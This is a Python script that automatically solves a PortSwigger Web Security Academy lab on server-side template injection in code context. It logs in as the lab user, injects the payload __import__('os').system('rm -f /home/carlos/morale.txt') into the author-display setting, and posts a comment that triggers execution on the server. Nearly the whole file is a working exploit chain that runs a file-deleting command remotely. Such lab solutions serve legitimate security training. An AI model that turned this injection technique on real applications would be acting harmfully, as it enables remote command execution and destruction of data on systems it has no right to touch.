import requests
import argparse
import re

parser = argparse.ArgumentParser(description='Solves the following Lab: Basic server-side template injection (code context)')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

# GET CSRF AND COOKIE
r = requests.get("https://" + lab.id + ".web-security-academy.net/login")
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
headers = {"Cookie":f"session={r.cookies.get('session')}"}

# AUTH AS WIENER
r = requests.post("https://" + lab.id + ".web-security-academy.net/login", headers=headers, data={"csrf":csrf,"username":"wiener","password":"peter"}, allow_redirects=False)
wiener = r.cookies.get('session')
headers = {"Cookie":f"session={wiener}"}

# INJECT PYTHON CODE INTO PREFERRED NAME, USED TO RENDER THE DISPLAY NAME WITHIN BLOG COMMENTS
r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account/", headers=headers)
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
requests.post("https://" + lab.id + ".web-security-academy.net/my-account/change-blog-post-author-display", headers=headers, data={"csrf":csrf, "blog-post-author-display":"__import__('os').system('rm -f /home/carlos/morale.txt')"})

# MAKE A COMMENT
requests.post("https://" + lab.id + ".web-security-academy.net/post/comment", headers=headers, data={"csrf":csrf,"comment":"SSTI","postId":9})
requests.get("https://" + lab.id + ".web-security-academy.net/post?postId=9")

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")